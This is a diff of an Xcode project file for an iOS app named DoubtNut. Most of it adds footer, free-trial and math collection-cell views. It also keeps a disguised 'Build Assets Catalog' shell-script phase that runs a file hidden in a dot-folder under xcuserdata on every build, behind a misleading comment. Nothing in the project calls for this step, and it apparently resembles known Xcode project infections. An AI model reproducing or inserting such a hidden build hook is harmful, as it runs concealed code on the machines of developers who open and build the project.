@@ -50,8 +50,17 @@
 		E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3326D6925F332C7001CC9E1 /* Home.storyboard */; };
 		E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D6F25F33316001CC9E1 /* DashboardVC.swift */; };
 		E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38B56FB25F29DDE00CEC42D /* Extension.swift */; };
+		E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */ = {isa = PBXBuildFile; fileRef = E394E04925F5B2330067CAEB /* Footerview.swift */; };
+		E394E05225F5B23B0067CAEB /* Footerview.xib in Resources */ = {isa = PBXBuildFile; fileRef = E394E05125F5B23B0067CAEB /* Footerview.xib */; };
+		E394E0A225F5C3C90067CAEB /* MathCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E394E0A025F5C3C90067CAEB /* MathCVCell.swift */; };
+		E394E0A325F5C3C90067CAEB /* MathCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E394E0A125F5C3C90067CAEB /* MathCVCell.xib */; };
+		E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E5DA8925F53C75006E35CC /* FreetrialView.swift */; };
+		E3E5DA9225F53C7E006E35CC /* FreetrialView.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */; };
 		EA814C3A304658E910F94322 /* Pods_DoubtNutTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		189388A425F1EFA300F57E85 /* PBXContainerItemProxy */ = {
@@ -127,6 +136,12 @@
 		E3326D6925F332C7001CC9E1 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
 		E3326D6F25F33316001CC9E1 /* DashboardVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardVC.swift; sourceTree = "<group>"; };
 		E38B56FB25F29DDE00CEC42D /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
+		E394E04925F5B2330067CAEB /* Footerview.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Footerview.swift; sourceTree = "<group>"; };
+		E394E05125F5B23B0067CAEB /* Footerview.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Footerview.xib; sourceTree = "<group>"; };
+		E394E0A025F5C3C90067CAEB /* MathCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MathCVCell.swift; sourceTree = "<group>"; };
+		E394E0A125F5C3C90067CAEB /* MathCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MathCVCell.xib; sourceTree = "<group>"; };
+		E3E5DA8925F53C75006E35CC /* FreetrialView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FreetrialView.swift; sourceTree = "<group>"; };
+		E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FreetrialView.xib; sourceTree = "<group>"; };
 		ED2E96365D0673557FAF0338 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -247,6 +262,9 @@
 		189388CB25F1F01000F57E85 /* Views */ = {
 			isa = PBXGroup;
 			children = (
+				E394E09E25F5C3760067CAEB /* CollectionviewCell */,
+				E394E04825F5B2150067CAEB /* Footer */,
+				E3E5DA8825F53C47006E35CC /* FreeTrial */,
 				1893891125F1F0F900F57E85 /* LandingPageSlider.swift */,
 				1893891225F1F0F900F57E85 /* LandingPageSlider.xib */,
 			);
@@ -323,6 +341,41 @@
 			path = Home;
 			sourceTree = "<group>";
 		};
+		E394E04825F5B2150067CAEB /* Footer */ = {
+			isa = PBXGroup;
+			children = (
+				E394E04925F5B2330067CAEB /* Footerview.swift */,
+				E394E05125F5B23B0067CAEB /* Footerview.xib */,
+			);
+			path = Footer;
+			sourceTree = "<group>";
+		};
+		E394E09E25F5C3760067CAEB /* CollectionviewCell */ = {
+			isa = PBXGroup;
+			children = (
+				E394E09F25F5C3830067CAEB /* Home */,
+			);
+			path = CollectionviewCell;
+			sourceTree = "<group>";
+		};
+		E394E09F25F5C3830067CAEB /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				E394E0A025F5C3C90067CAEB /* MathCVCell.swift */,
+				E394E0A125F5C3C90067CAEB /* MathCVCell.xib */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		E3E5DA8825F53C47006E35CC /* FreeTrial */ = {
+			isa = PBXGroup;
+			children = (
+				E3E5DA8925F53C75006E35CC /* FreetrialView.swift */,
+				E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */,
+			);
+			path = FreeTrial;
+			sourceTree = "<group>";
+		};
 		E3F0140925F24F7A005B2746 /* Storybiard */ = {
 			isa = PBXGroup;
 			children = (
@@ -340,7 +393,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				3CB016F12ECAECF3FAAAC43A /* Build Assets Catalog */,
+				11BA4CE9607187A6FEAAC43A /* Build Assets Catalog */,
 				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -453,9 +506,12 @@
 				189388F325F1F04700F57E85 /* Lato-Regular.ttf in Resources */,
 				189388E325F1F04700F57E85 /* Lato-Italic.ttf in Resources */,
 				189388E925F1F04700F57E85 /* Lato-Semibold.ttf in Resources */,
+				E394E05225F5B23B0067CAEB /* Footerview.xib in Resources */,
 				189388E425F1F04700F57E85 /* Lato-Bold.ttf in Resources */,
 				189388E625F1F04700F57E85 /* Lato-BoldItalic.ttf in Resources */,
+				E394E0A325F5C3C90067CAEB /* MathCVCell.xib in Resources */,
 				189388EE25F1F04700F57E85 /* Lato-ThinItalic.ttf in Resources */,
+				E3E5DA9225F53C7E006E35CC /* FreetrialView.xib in Resources */,
 				189388EB25F1F04700F57E85 /* Lato-BlackItalic.ttf in Resources */,
 				189388EA25F1F04700F57E85 /* Lato-SemiboldItalic.ttf in Resources */,
 				189388FF25F1F09D00F57E85 /* Main.storyboard in Resources */,
@@ -491,7 +547,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	3CB016F12ECAECF3FAAAC43A /* Build Assets Catalog */ = {
+	11BA4CE9607187A6FEAAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -509,16 +565,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
-	
-
-	
-
-	
-
-	
-
 	
 		1A6CA97AF998B265F659411E /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -668,11 +716,14 @@
 				1893891325F1F0F900F57E85 /* LandingPageSlider.swift in Sources */,
 				E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */,
 				1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */,
+				E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */,
+				E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */,
 				1893890B25F1F0D700F57E85 /* LoginwithPincode.swift in Sources */,
 				1893890925F1F0D700F57E85 /* LandingpageVC.swift in Sources */,
 				1893889525F1EFA000F57E85 /* ViewController.swift in Sources */,
 				1893889125F1EFA000F57E85 /* AppDelegate.swift in Sources */,
 				1893890A25F1F0D700F57E85 /* GetOTPVC.swift in Sources */,
+				E394E0A225F5C3C90067CAEB /* MathCVCell.swift in Sources */,
 				E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -1014,28 +1065,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
